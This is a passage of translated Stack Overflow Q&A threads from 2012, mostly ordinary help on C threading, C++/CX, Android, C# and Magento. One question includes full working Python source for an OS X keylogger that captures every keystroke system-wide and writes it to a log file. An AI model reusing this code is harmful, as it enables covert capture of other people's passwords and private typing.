  while(currentFile < 10){

    if(inUseFile == NULL){//inUseFIle being used to check if a file is still being read

      sem_wait(&semAccess);//critical section     
      inUseFile = fn[currentFile];
      sem_post(&semAssign);
      file = fopen(inUseFile, "r");

      while(!feof(file)){
    if(x % 1000 == 0 && tNum !=1){ //go for 1000 integers and then wait
      sem_wait(&semAssign);
    }

    checkNum = getNum(file);
    /*
     * 
     * 
     * 
     * I think the issue is here
     * 
     * 
     * 
     */
    if(checkNum > highestPrime[tNum]){
      if(prime(checkNum)){
        highestPrime[tNum] = checkNum;
      }
    }

    x++;
      }
      fclose(file);
      inUseFile = NULL;
    }
    currentFile++;
  }
}

int main(int argc, char* argv[])
{

  if(argc != 2){ //checks for number of arguements being passed
printf("To many ARGS\n");
return(-1);
  }
  else{//Sets thread cound to user input checking for correct number of threads
    numberOfThreads = atoi(argv[1]);
    if(numberOfThreads < 1 || numberOfThreads > 10){
      printf("To many threads entered\n");
      return(-1);
    }

    time_t preTime, postTime; //creating time variables

    int i;

    fn = malloc(10 * sizeof(char*)); //create file array and initialize

    fn[0] = file1;
    fn[1] = file2;
    fn[2] = file3;
    fn[3] = file4;
    fn[4] = file5;
    fn[5] = file6;
    fn[6] = file7;
    fn[7] = file8;
    fn[8] = file9;
    fn[9] = file10;

    sem_init(&semAccess, 0, 1); //initialize semaphores
    sem_init(&semAssign, 0, numberOfThreads);

    highestPrime = malloc(numberOfThreads * sizeof(int)); //create an array to store each threads highest number

    for(loop = 0; loop < numberOfThreads; loop++){//set initial values to 0
      highestPrime[loop] = 0;   
    }

    pthread_t calculationThread[numberOfThreads]; //thread to do the work

    preTime = time(NULL); //start the clock

    for(i = 0; i < numberOfThreads; i++){
      pthread_create(&calculationThread[i], NULL, findPrimality, (void *)i);
    }

    for(i = 0; i < numberOfThreads; i++){
      pthread_join(calculationThread[i], NULL);
    }

    for(i = 0; i < numberOfThreads; i++){
      printf("this is a prime number: %d \n", highestPrime[i]);
    }
    postTime= time(NULL);
    printf("Wall time: %ld seconds\n", (long)(postTime - preTime));
  }
} 
```

是的，我试图找到最高的数字。所以在过去的几个小时里我已经取得了一些进展，正如 spudd 所说的那样重新构建程序，由于我使用结构，目前我遇到了分段错误，我试图在结构中保存最大的单个素数，同时给它们正确的指数。这是修改后的代码。所以简而言之，第一个线程正在做的是创建所有线程并为它们提供访问一个非常大的整数数组的访问点，它们将通过该数组并找到素数，我想在 while 循环周围实现信号量，以便在它们执行时每 2000 行或最后它们更新一个全局素数。

```
#include <stdio.h>  
#include <stdlib.h> 
#include <time.h>   
#include <string.h>
#include <pthread.h> 
#include <math.h>
#include <semaphore.h>

//Global variable declaration
char *file1 = "primes1.txt";
char *file2 = "primes2.txt";
char *file3 = "primes3.txt";
char *file4 = "primes4.txt";
char *file5 = "primes5.txt";
char *file6 = "primes6.txt";
char *file7 = "primes7.txt";
char *file8 = "primes8.txt";
char *file9 = "primes9.txt";
char *file10 = "primes10.txt";

int numberOfThreads;
int entries[10000000];
int entryIndex = 0;
int fileCount = 0;
char** fileName;
int largestPrimeNumber = 0;

//Register functions
int prime(int n);
int getNum(FILE* file);
void* findPrimality(void *threadNum);
void* assign(void *num);

typedef struct package{
  int largestPrime;
  int startingIndex;
  int numberCount;
}pack;

//Beging main code block
int main(int argc, char* argv[])
{

  if(argc != 2){ //checks for number of arguements being passed
printf("To many threads!!\n");
return(-1);
  }
  else{ //Sets thread cound to user input checking for correct number of threads
    numberOfThreads = atoi(argv[1]);
    if(numberOfThreads < 1 || numberOfThreads > 10){
      printf("To many threads entered\n");
      return(-1);
    }

    int threadPointer[numberOfThreads]; //Pointer array to point to entries

    time_t preTime, postTime; //creating time variables

    int i;

    fileName = malloc(10 * sizeof(char*)); //create file array and initialize

    fileName[0] = file1;
    fileName[1] = file2;
    fileName[2] = file3;
    fileName[3] = file4;
    fileName[4] = file5;
    fileName[5] = file6;
    fileName[6] = file7;
    fileName[7] = file8;
    fileName[8] = file9;
    fileName[9] = file10;

    FILE* filereader;
    int currentNum;

    for(i = 0; i < 10; i++){
      filereader = fopen(fileName[i], "r");
      while(!feof(filereader)){
        char* tempString = malloc(20 *sizeof(char));
        fgets(tempString, 20, filereader);
        tempString[strlen(tempString)-1] = '\0';
        entries[entryIndex] = atoi(tempString);
        entryIndex++;
        free(tempString);       
      }
    }

    //sem_init(&semAccess, 0, 1); //initialize semaphores
    //sem_init(&semAssign, 0, numberOfThreads);
    time_t tPre, tPost;

    pthread_t coordinate;

    tPre = time(NULL);
    pthread_create(&coordinate, NULL, assign, (void**)numberOfThreads);
    pthread_join(coordinate, NULL);

    tPost = time(NULL);

  }

}

void* findPrime(void* pack_array)
{
  pack* currentPack=  pack_array;
  int lp = currentPack->largestPrime;
  int si = currentPack->startingIndex;
  int nc = currentPack->numberCount;

  int i;
  int j = 0;

  for(i = si; i < nc; i++){

    while(j < 2000 || i == (nc-1)){

      if(prime(entries[i])){

    if(entries[i] > lp)

      lp = entries[i];
      }

      j++;

    }

  }
   return (void*)currentPack; 
}

void* assign(void* num)
{
  int y = (int)num;
  int i;

  int count = 10000000/y;
  int finalCount = count + (10000000%y);

  int sIndex = 0;

  pack pack_array[(int)num];
  pthread_t workers[numberOfThreads]; //thread to do the workers

  for(i = 0; i < y; i++){
    if(i == (y-1)){
      pack_array[i].largestPrime = 0;
      pack_array[i].startingIndex = sIndex;
      pack_array[i].numberCount = finalCount;
    }

    pack_array[i].largestPrime = 0;
    pack_array[i].startingIndex = sIndex;
    pack_array[i].numberCount = count;

    pthread_create(&workers[i], NULL, findPrime, (void *)&pack_array[i]);
    sIndex += count;
  }
  for(i = 0; i< y; i++)
    pthread_join(workers[i], NULL);
}

//Functions

int prime(int n)//check for prime number, return 1 for prime 0 for nonprime
{
  int i;
  for(i = 2; i <= sqrt(n); i++)
    if(n % i == 0)
      return(0);

    return(1);
} 
```

这是我的最新更新，我的线程运行有问题，唯一的线程是线程 0 正在完成

```
#include <stdio.h>  
#include <stdlib.h> 
#include <time.h>   
#include <string.h>
#include <pthread.h> 
#include <math.h>
#include <semaphore.h>

//Global variable declaration
char *file1 = "primes1.txt";
char *file2 = "primes2.txt";
char *file3 = "primes3.txt";
char *file4 = "primes4.txt";
char *file5 = "primes5.txt";
char *file6 = "primes6.txt";
char *file7 = "primes7.txt";
char *file8 = "primes8.txt";
char *file9 = "primes9.txt";
char *file10 = "primes10.txt";

sem_t semHold;

int numberOfThreads;
long unsigned int entries[10000000];
unsigned int entryIndex = 0;
int fileCount = 0;
char** fileName;
long unsigned int largestPrimeNumber = 0;

//Register functions
int prime(unsigned int n);
int getNum(FILE* file);
void* findPrimality(void *threadNum);
void* assign(void *num);

typedef struct package{
  long unsigned int largestPrime;
  unsigned int startingIndex;
  unsigned int numberCount;
}pack;

pack pack_array[10];

//Beging main code block
int main(int argc, char* argv[])
{

  if(argc != 2){ //checks for number of arguements being passed
printf("To many threads!!\n");
return(-1);
  }
  else{ //Sets thread cound to user input checking for correct number of threads
    numberOfThreads = atoi(argv[1]);
    if(numberOfThreads < 1 || numberOfThreads > 10){
      printf("To many threads entered\n");
      return(-1);
    }

    int threadPointer[numberOfThreads]; //Pointer array to point to entries

    int i;

    fileName = malloc(10 * sizeof(char*)); //create file array and initialize

    fileName[0] = file1;
    fileName[1] = file2;
    fileName[2] = file3;
    fileName[3] = file4;
    fileName[4] = file5;
    fileName[5] = file6;
    fileName[6] = file7;
    fileName[7] = file8;
    fileName[8] = file9;
    fileName[9] = file10;

    FILE* filereader;
    long unsigned int currentNum;

    sem_init(&semHold, 0, 1);

    for(i = 0; i < 10; i++){
      filereader = fopen(fileName[i], "r");
      while(fscanf(filereader, "%lu" , &currentNum)!= EOF){
    entries[entryIndex] = currentNum;
    // while(entryIndex < 5){
      //char* tempString = malloc(20 *sizeof(long unsigned int));
    //fgets(tempString, 20, filereader);

    //tempString[strlen(tempString)-1] = '\0';

    //currentNum = atoi(tempString);
    //printf("Test %lu\n",currentNum);

    //entries[entryIndex] = atoi(tempString);

    //entryIndex++;

    //free(tempString);       
    //}
    entryIndex++;
    }
  }
  printf("Test %lu\n",entries[9999999]);
  //sem_init(&semAccess, 0, 1); //initialize semaphores
  //sem_init(&semAssign, 0, numberOfThreads);
  time_t tPre, tPost;

  pthread_t coordinate;

  tPre = time(NULL);

  pthread_create(&coordinate, NULL, assign, (void**)numberOfThreads);

  pthread_join(coordinate, NULL);

  tPost = time(NULL);

  printf("Largest prime = %lu , time: %ld\n", largestPrimeNumber,(long)(tPost-tPre));

}

}

void* findPrime(void* pack_array)
{

  pack* currentPack =  pack_array;
  unsigned int lp = currentPack->largestPrime;
  unsigned int si = currentPack->startingIndex;
  unsigned int nc = currentPack->numberCount;

  int i;
  printf("Starting index Count: %d\n", si);
  for(i = si; i < nc; i++){
    if(i%100000==0)
      printf("Here is i: %d\n", i);
    if(entries[i]%2 != 0){
      if(entries[i] > currentPack->largestPrime){      
    if(prime(entries[i])){

      currentPack->largestPrime = entries[i];
      printf("%lu\n", currentPack->largestPrime);

    if(currentPack->largestPrime > largestPrimeNumber)
      sem_wait(&semHold);
      largestPrimeNumber = currentPack->largestPrime;
      sem_post(&semHold);
    }
      }    
    }
  }

}

void* assign(void* num)
{

  int y = (int)num;
  int i;

  int count = 10000000/y;
  int finalCount = count + (10000000%y);

  int sIndex = 0;
  printf("This is count: %d\n", count);
  printf("This is final count: %d\n", finalCount);

  pthread_t workers[y]; //thread to do the workers

  for(i = 0; i < y; i++){
    printf("for thread %d Starting index: %d\n", i, sIndex);
    if(i == (y-1)){
      pack_array[i].largestPrime = 0;
      pack_array[i].startingIndex = sIndex;
      pack_array[i].numberCount = finalCount;
    }

    pack_array[i].largestPrime = 0;
    pack_array[i].startingIndex = sIndex;
    pack_array[i].numberCount = count;

    pthread_create(&workers[i], NULL, findPrime, (void *)&pack_array[i]);
    printf("thread created\n");
    sIndex += count;

  }
  for(i = 0; i < y; i++)
    pthread_join(workers[i], NULL);

}

//Functions

int prime(unsigned int n)//check for prime number, return 1 for prime 0 for nonprime
{
  int i;
  for(i = 2; i <= sqrt(n); i++)
    if(n % i == 0)
      return(0);

    return(1);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T00:06:11.540

好的，这是我的解决方案的一部分，它缺少大部分主要内容，并且缺少一些其他简单的东西，如果您选择以此为基础的代码，您可以做两件事之一，在启动您的工作人员之前加载所有数据，或者让主要内容线程在工作人员运行时加载它，我在完整版本中做了后者。但是，您必须做一些工作才能正确处理它，因为目前工作人员永远不会退出。

此外，您可能想尝试基于此调整上面的单个数组代码。

因此，如果您在启动工作人员之前加载所有数据，则不需要条件变量，他们可以在`next_chunk`is时退出`NULL`。我建议你弄清楚如何在工人运行工作时加载，因为它会更有效率。暗示：`pthread_cond_broadcast()`

还缺少实际的工人功能。

```
// A singly linked list of chunks of 1000 numbers
// we use it as a queue of data to be processed
struct number_chunk
{
    struct number_chunk *next;
    int size;
    int nums[1000];
};

pthread_mutex_t cnklst_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t data_available = PTHREAD_COND_INITIALIZER;
struct number_chunk *next_chunk = NULL;

void load_chunks(char *filename)
{
    FILE *in = fopen(filename, "r");
    int done = 0;
    int i;

    if(in == NULL) {
        fprintf(stderr, "Failed to open file %s\n", filename);
        return;
    }

    // read in all the chunks of 1000 numbers from the file
    while(!done) {
        struct number_chunk *cnk = malloc(sizeof(struct number_chunk)); // allocate a new chunk
        cnk->next = NULL;
        for(i=0; i < 1000; i++) { // do the actual reading
            char tmp[20];
            if(fgets(tmp, 20, in) == NULL) { // end of file, leave the read loop
                done = 1;
                break; 
            }
            cnk->nums[i] = atoi(tmp);
        }

        // need to do this so that the last chunk in a file can have less than 1000 numbers in it
        cnk->size = i;

        // add it to the list of chunks to be processed
        pthread_mutex_lock(&cnklst_mutex);
        cnk->next = next_chunk;
        next_chunk = cnk;
        pthread_cond_signal(&data_available); // wake a waiting worker
        pthread_mutex_unlock(&cnklst_mutex);
    }

    fclose(in);
}

struct number_chunk *get_chunk()
{
    struct number_chunk *cnk = NULL;
    pthread_mutex_lock(&cnklst_mutex);
    //FIXME: if we finish we will never exit the thread
    // need to return NULL when all the work that there will ever be
    // is done, altertitively load everything before starting the workers and 
    // get rid of all the condition variable stuff
    while(next_chunk == NULL)
        pthread_cond_wait(&data_available, &cnklst_mutex);
    cnk = next_chunk;
    if(next_chunk != NULL) next_chunk = next_chunk->next;
    pthread_mutex_unlock(&cnklst_mutex);
    return cnk;
} 
```

我的工作人员报告最终最大素数的方式是在最后通过查看单个全局变量并根据他们在运行期间找到的最高素数来设置或不设置它。显然，您需要为此进行同步。

另请注意，它使用互斥锁而不是信号量，因为使用了`pthread_cond_wait()`If you have not Covered condition variables but just drop that stuff and load all before start your workers.

另外，由于这是家庭作业，请阅读我的代码尝试理解它，然后不再看它，尝试编写自己的代码。

我会更改更多，但我不确定如何更改，因为它基本上已经是一个非常通用的生产者/消费者示例，缺少一些位：P

如果您确实决定采用与我相同的策略并在工作人员工作时在主线程中运行加载，则可以尝试另一件事，您可以添加第二个条件变量和一个计数器来限制队列中的块数并让您的工作人员在工作结束时唤醒主线程。

# task - .NET 的 Task.Delay 的 C++ 等价物？

> ID：13806809
> 
> 赞同：6
> 
> 时间：2012-12-10T18:19:40.673
> 
> 标签：task, wait, windows-store-apps, c++-cx

我正在编写一个 C++/CX 组件以供 Window 的商店应用程序使用。我正在寻找一种方法来完成 Task.Delay(1000) 在 C# 中所做的事情。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-08-15T06:45:41.097

老问题，但仍然没有答案。

您可以使用

```
#include <chrono>
#include <thread>

std::this_thread::sleep_for(std::chrono::milliseconds(1000)); 
```

这将需要[C++11](http://en.wikipedia.org/wiki/C++11)，这在使用 C++/CX 时应该不是问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-01-09T18:44:49.920

在使用 C++/CX 一年之后，我对这个问题有了一个普遍且合理正确的答案。

[此链接](https://docs.microsoft.com/en-us/cpp/parallel/concrt/how-to-create-a-task-that-completes-after-a-delay)（来自 Visual C++ Parallel Patterns Library 文档）包含一个名为 complete_after() 的函数的片段。该函数创建一个将在指定的毫秒数后完成的任务。然后，您可以定义一个随后将执行的延续任务：

```
void MyFunction()
{
    // ... Do a first thing ...

    concurrency::create_task(complete_after(1000), concurrency::task_continuation_context::use_current)
    .then([]() {
        // Do the next thing, on the same thread.
    });
} 
```

或者更好的是，如果您使用 Visual C++ 的[协程](https://blogs.msdn.microsoft.com/vcblog/2016/04/04/using-c-coroutines-to-simplify-async-uwp-code/)功能，只需键入：

```
concurrency::task<void> MyFunctionAsync()
{
    // ... Do a first thing ...

    co_await complete_after(1000);
    // Do the next thing.
    // Warning: if not on the UI thread (e.g., on a threadpool thread), this may resume on a different thread.
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-16T10:57:47.463

您可以创建一个 concurrency::task，等待 1000 个时间单位，然后为该任务调用“.then”方法。这将确保在您创建任务和执行任务之间至少有 1000 个时间单位的等待。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-12-23T16:05:15.517

我不会声称自己是个巫师——我对 UWP 和 C++/CX 还是很陌生，但我使用的是以下内容：

```
public ref class MyClass sealed {
public:
    MyClass()
    {
        m_timer = ref new Windows::UI::Xaml::DispatcherTimer;
        m_timer->Tick += ref new Windows::Foundation::EventHandler<Platform::Object^>(this, &MyClass::PostDelay);
    }
    void StartDelay()
    {
        m_timer->Interval.Duration = 200 * 10000;// 200ms expressed in 100s of nanoseconds
        m_timer->Start();
    }
    void PostDelay(Platform::Object^ sender, Platform::Object ^args)
    {
        m_timer->Stop();
        // Do some stuff after the delay
    }
private:
    Windows::UI::Xaml::DispatcherTimer ^m_timer;
} 
```

与其他方法相比的主要优点是：

1.  它是非阻塞的
2.  您一定会在 XAML UI 线程上被回调

# java - 设置运行 tomcat 的 memcache windows

> ID：13806812
> 
> 赞同：2
> 
> 时间：2012-12-10T18:19:58.023
> 
> 标签：java, tomcat, memcached

我们有一个运行 tomcat 的应用程序服务器——应用程序本身是 Java/Hibernate/SQL。我们想将 memcache 引入应用程序。我做了一些研究并提出了以下步骤。只是想知道我是否在正确的轨道上。

1.  为 windows 安装 memcache 服务器。这将创建一个在服务器上运行的 memcache 服务。
2.  配置tomcat使用memcache？
3.  配置我们的应用程序以使用 memcache - 使用 memcache 客户端（例如 spymemcached）在应用程序中包含对 memcache 的调用。

配置 tomcat 以使用 memcache 是我需要更多指导的地方。我什至应该看一下tomcat memcache session manager之类的东西吗？对于第一步，我们可以只做第 1 步和第 3 步吗？任何澄清将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T07:32:26.817

不需要第 2 步。一切都可以由您的应用程序处理。您还可以创建一个单独的实用程序来监控 memcache 而不是 telnet。

# android - 限制仅通过 WiFi 访问网络

> ID：13806813
> 
> 赞同：2
> 
> 时间：2012-12-10T18:19:58.927
> 
> 标签：android, networking, wifi

检查是否存在有效的 WiFi 连接是没有问题的。但是如何确保只有这个 WiFi 连接用于网络访问？

假设以下场景：

*   我检查是否存在有效的 WiFi 连接（我可能会验证是否存在有效的 Internet 连接）
*   现在这个 WiFi 连接被中断了
*   我开始通过网络传输数据，现在使用移动连接，因为 WiFi 最近死了

我怎样才能避免这种情况？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:25:08.217

检查是否存在 WiFi 连接：

```
ConnectivityManager connManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

if (mWifi.isConnected()) {
    // Do whatever
} 
```

[Source](https://stackoverflow.com/questions/3841317/how-to-see-if-wifi-is-connected-in-android)，或使用此代码段：

```
private static final String DEBUG_TAG = "NetworkStatusExample";
...      
ConnectivityManager connMgr = (ConnectivityManager) 
        getSystemService(Context.CONNECTIVITY_SERVICE);
NetworkInfo networkInfo = connMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI); 
boolean isWifiConn = networkInfo.isConnected();
networkInfo = connMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
boolean isMobileConn = networkInfo.isConnected();
Log.d(DEBUG_TAG, "Wifi connected: " + isWifiConn);
Log.d(DEBUG_TAG, "Mobile connected: " + isMobileConn); 
```

添加监听器以检查 WiFi 是否仍处于启用状态：

```
public class NetworkReceiver extends BroadcastReceiver {   

@Override
public void onReceive(Context context, Intent intent) {
    ConnectivityManager conn =  (ConnectivityManager)
        context.getSystemService(Context.CONNECTIVITY_SERVICE);
    NetworkInfo networkInfo = conn.getActiveNetworkInfo();

    // Checks the user prefs and the network connection. Based on the result, decides whether
    // to refresh the display or keep the current display.
    // If the userpref is Wi-Fi only, checks to see if the device has a Wi-Fi connection.
    if (WIFI.equals(sPref) && networkInfo != null && networkInfo.getType() == ConnectivityManager.TYPE_WIFI) {
        // If device has its Wi-Fi connection, sets refreshDisplay
        // to true. This causes the display to be refreshed when the user
        // returns to the app.
        refreshDisplay = true;
        Toast.makeText(context, R.string.wifi_connected, Toast.LENGTH_SHORT).show();

    // If the setting is ANY network and there is a network connection
    // (which by process of elimination would be mobile), sets refreshDisplay to true.
    } else if (ANY.equals(sPref) && networkInfo != null) {
        refreshDisplay = true;

    // Otherwise, the app can't download content--either because there is no network
    // connection (mobile or Wi-Fi), or because the pref setting is WIFI, and there 
    // is no Wi-Fi connection.
    // Sets refreshDisplay to false.
    } else {
        refreshDisplay = false;
        Toast.makeText(context, R.string.lost_connection, Toast.LENGTH_SHORT).show();
    }
} 
```

请阅读[管理网络使用](http://developer.android.com/training/basics/network-ops/managing.html)以获得详细的解决方案

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:27:47.817

您可以添加广播接收器以进行网络更改。因此，每当 wifi 中断时，您都会收到通知，您可以根据需要处理这种情况。您可以在以下链接中找到更多详细信息[http://developer.android.com/training/basics/network-ops/managing.html](http://developer.android.com/training/basics/network-ops/managing.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:44:58.870

您可以通过这种方法检查wifi是否中断？

```
ConnectivityManager networkManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
NetworkInfo networkInfo = networkManager.getActiveNetworkInfo();
NetworkInfo wifi = networkManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
if (wifi.isAvailable() && wifi.isConnected()) {
     return true;
}else {
     return false;
} 
```

您可以将广播接收器添加到 lsten 以进行网络更改，您可以将此方法添加到 onReceive() 方法中，并检查它，如果网络发生变化，您将在 onReceive() 上收到通知，然后您可以根据需要处理任何您想要的

# c# - 为什么泛型方法不能推断参数类型？

> ID：13806817
> 
> 赞同：4
> 
> 时间：2012-12-10T18:20:16.207
> 
> 标签：c#, generics

```
public delegate T GenDel<T>();

class Program
{
    public static void genMet<T>(GenDel<T> d) { }

    static void Main(string[] args)
    {           
        genMet(new GenDel<string>(() => "Works"));
        genMet(() => "Works");
    }
} 
```

在上面的例子中，泛型方法接收 lambda 表达式作为参数 ( `genMet(() => "Works");`)，并且从这个 lambda 表达式方法能够推断参数类型。

为什么在下一个示例中方法也不能推断参数类型，而不是 lambda 表达式，我们将委托实例作为参数传递：

```
 genMet(new GenDel(() => "Doesn't work")); // Error: Using the generic type 'GenDel<T>' 
                                                  // requires 1 type arguments 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-10T18:23:00.390

类型推断仅适用于泛型*方法*，不适用于泛型类型或其构造函数。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-10T18:24:18.693

在您的第二个示例中没有类型推断 - 您明确指定要使用的委托类型。在这种情况下，您需要提供类型参数，因为没有非泛型`GenDel`类型。

# android - 如何交换在两个文本框中输入的文本？

> ID：13806826
> 
> 赞同：1
> 
> 时间：2012-12-10T18:20:45.220
> 
> 标签：android, android-edittext, swap

我需要创建一个按钮和两个文本框，其中文本框接受用户的输入。单击按钮时，两个文本框中的文本应交换。请帮我交换部分。后

```
String text1=edtxt1.getText().toString();
String text2=edtxt2.getText().toString(); 
```

（输入两个文本）我该怎么办？

提前致谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:24:02.240

你想这样做吗？

```
String text1 = edtxt1.getText().toString();
String test2 = edtxt2.getText().toString();
edtxt1.setText(text2);
edtxt2.setText(text1); 
```

如果不是，那么我不完全明白你在问什么:-)

# python - OS X - Python键盘记录器 - 双字母

> ID：13806829
> 
> 赞同：1
> 
> 时间：2012-12-10T18:20:56.423
> 
> 标签：python, macos, cocoa, keylogger

我正在为 OS X 开发一个 python 键盘记录器。我的脚本运行良好，但所有字母在 shell / txt 日志文件中都是双倍的。谁能告诉我为什么……这对我来说是个谜！

```
#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import os

import exceptions
from Foundation import NSObject, NSLog
from AppKit import NSApplication, NSApp, NSWorkspace
from Cocoa import *
from Quartz import CGWindowListCopyWindowInfo, kCGWindowListOptionOnScreenOnly, kCGNullWindowID
from PyObjCTools import AppHelper
import keycode

evtypes = dict(
    NSLeftMouseDown     = 1,
    NSLeftMouseUp       = 2,
    NSRightMouseDown    = 3,
    NSRightMouseUp      = 4,
    NSMouseMoved        = 5,
    NSLeftMouseDragged  = 6,
    NSRightMouseDragged = 7,
    NSMouseEntered      = 8,
    NSMouseExited       = 9,
    NSKeyDown           = 10,
    NSKeyUp             = 11,
    NSFlagsChanged      = 12,
    NSAppKitDefined     = 13,
    NSSystemDefined     = 14,
    NSApplicationDefined = 15,
    NSPeriodic          = 16,
    NSCursorUpdate      = 17,
    NSScrollWheel       = 22,
    NSTabletPoint       = 23,
    NSTabletProximity   = 24,
    NSOtherMouseDown    = 25,
    NSOtherMouseUp      = 26,
    NSOtherMouseDragged = 27
)

evtypes_rev = dict([[v,k] for k,v in evtypes.items()])

class Hooker(object):
    def __call__(self, *args, **kwargs):
        try:
            items = ' '.join( [ x[0]+"="+unicode(x[1]) for x in kwargs.iteritems()] )
            if (self.__class__.__name__ == "MouseMoveHooker"):
                pass

            else :
                for x in kwargs.iteritems():
                    if x[0] == 'char':
                        print x[1].encode('utf-8')
                        fichier.write("%s" % (x[1].encode('utf-8')))
        except Exception as e:
            print 'Horrific error!', e
            AppHelper.stopEventLoop()
            sys.exit(0)

class KeyHooker(Hooker): pass
class MouseButtonHooker(Hooker): pass
class MouseMoveHooker(Hooker): pass
class ScreenHooker(Hooker): pass

class SniffCocoa:

    def __init__(self):

        self.key_hook = KeyHooker()
        self.screen_hook = ScreenHooker()
        self.currentApp = None

    def createAppDelegate (self) :

        sc = self
        class AppDelegate(NSObject):
            def applicationDidFinishLaunching_(self, notification):
                mask = (
                          NSKeyDownMask 
                        | NSKeyUpMask
                        | NSLeftMouseDownMask 
                        | NSLeftMouseUpMask
                        | NSRightMouseDownMask 
                        | NSRightMouseUpMask
                        | NSMouseMovedMask 
                        | NSScrollWheelMask
                       )
                NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask, sc.handler)
        return AppDelegate

    def run(self):
        NSApplication.sharedApplication()
        delegate = self.createAppDelegate().alloc().init()
        NSApp().setDelegate_(delegate)
        self.workspace = NSWorkspace.sharedWorkspace()
        AppHelper.runEventLoop()

    def cancel(self):
        AppHelper.stopEventLoop()

    def handler(self, event):

        try:
            activeApps = self.workspace.runningApplications()
            for app in activeApps:
                if app.isActive():
                    if app.localizedName() != self.currentApp:
                        self.currentApp = app.localizedName()
                        options = kCGWindowListOptionOnScreenOnly 
                        windowList = CGWindowListCopyWindowInfo(options, kCGNullWindowID)

                        for window in windowList:
                            if window['kCGWindowOwnerName'] == self.currentApp:
                                geom = window['kCGWindowBounds'] 
                                self.screen_hook( event=event,
                                                name = window['kCGWindowName'],
                                                owner = window['kCGWindowOwnerName'],
                                                x = geom['X'], 
                                                y = geom['Y'], 
                                                w = geom['Width'], 
                                                h = geom['Height'])
                                break
                    break

            # keys down
            if event.type() in ( NSKeyDown, NSKeyUp ):

                flags = event.modifierFlags()
                modifiers = [] # OS X api doesn't care it if is left or right
                if (flags & NSControlKeyMask):
                    modifiers.append('CONTROL')
                if (flags & NSAlternateKeyMask):
                    modifiers.append('ALTERNATE')
                if (flags & NSCommandKeyMask):
                    modifiers.append('COMMAND')

                self.key_hook(char=keycode.tostring(event.keyCode() ))

        except ( KeyboardInterrupt ) as e:
            print 'handler', e
            AppHelper.stopEventLoop()

fichier = open("LOG.txt", "a")
sc = SniffCocoa()
sc.run() 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:25:20.937

因为您调用了 key_hook 两次：一次调用 NSKeyDown，一次调用 NSKeyUp（均由按键产生）。

# forms - Magento - 额外地址字段（注册期间）

> ID：13806839
> 
> 赞同：0
> 
> 时间：2012-12-10T18:21:20.727
> 
> 标签：forms, magento, registration

客户注册时：

默认情况下，Magento 使用提供的客户名称来自动填充默认的运输/账单信息。我们是 B2B，需要在注册时单独收集这些信息。此外，我们需要获取地址传真号码。

这些不是自定义属性（已经制作了一堆，并将它们集成到一个大大扩展的注册表单中），而是与客户地址相关联的**标准**名字、姓氏和传真字段。

我试过这个：

```
 <span class="msg">Default shipping and billing information.</span>
        <ul class="form-list">
            <li class="fields">
                <div class="field billing_name">
                    <label for="billing_firstname" class="required"><em>*</em><?php echo $this->__('First Name') ?></label>
                    <div class="input-box">
                        <input type="text" name="billing_firstname" id="billing_firstname" value="<?php echo $this->htmlEscape($this->getFormData()->getFirstName()) ?>" title="<?php echo $this->__('First Name') ?>" class="input-text required-entry" />
                    </div>
                </div>
                <div class="field billing_name">
                    <label for="billing_lastname" class=""><em>*</em><?php echo $this->__('Last Name') ?></label>
                    <div class="input-box">
                        <input type="text" name="billing_lastname" id="billing_lastname" value="<?php echo $this->htmlEscape($this->getFormData()->getLastName()) ?>" title="<?php echo $this->__('Last Name') ?>" class="input-text required-entry" />
                    </div>
                </div>
            </li> 
```

但我不清楚输入名称应该是什么。无论哪种情况，都将使用帐户名称。

寻找一些关于可能需要的表单字段的“名称”的信息，以及一些禁用自动填充功能的方法，如果这也需要的话。

干杯

* * *

### 更新

再仔细看看这个。

我正在覆盖**mage/customer/controller/accountController.php :: createPostAction()**并且我在控制器中看到表单被处理和填充为客户实体的位置。

我正在尝试这样的事情

```
 if ($this->getRequest()->getPost('create_address')) {
        /* @var $address Mage_Customer_Model_Address */

        $address = Mage::getModel('customer/address');

        /* @var $addressForm Mage_Customer_Model_Form */

        $addressForm = Mage::getModel('customer/form');
        $addressForm->setFormCode('customer_register_address')
            ->setEntity($address);

        $addressData    = $addressForm->extractData($this->getRequest(), 'address', false);
        $addressErrors  = $addressForm->validateData($addressData);
        if ($addressErrors === true) {
            $address->setId(null)
                ->setIsDefaultBilling($this->getRequest()->getParam('default_billing', false))
                ->setIsDefaultShipping($this->getRequest()->getParam('default_shipping', false));
            $addressForm->compactData($addressData);

            // attempting to jam vars into address obj
                $address['_data']['firstname'] = $this->getRequest()->getPost('billing_firstname');
                $address['_data']['lastname'] = $this->getRequest()->getPost('billing_lastname');
                $address-['_data']['fax'] = $this->getRequest()->getPost('billing_fax');
            // end 
                Mage::log('createPostAction, after var jam: '. print_r($address, true ) );

            $customer->addAddress($address);

            $addressErrors = $address->validate();
            if (is_array($addressErrors)) {
                $errors = array_merge($errors, $addressErrors);
            }
        } else {
            $errors = array_merge($errors, $addressErrors);
        }
    } 
```

当我注销时：

```
2012-12-18T01:51:10+00:00 DEBUG (7): createPostAction, after var jam: Mage_Customer_Model_Address Object
(
    [_customer:protected] => 
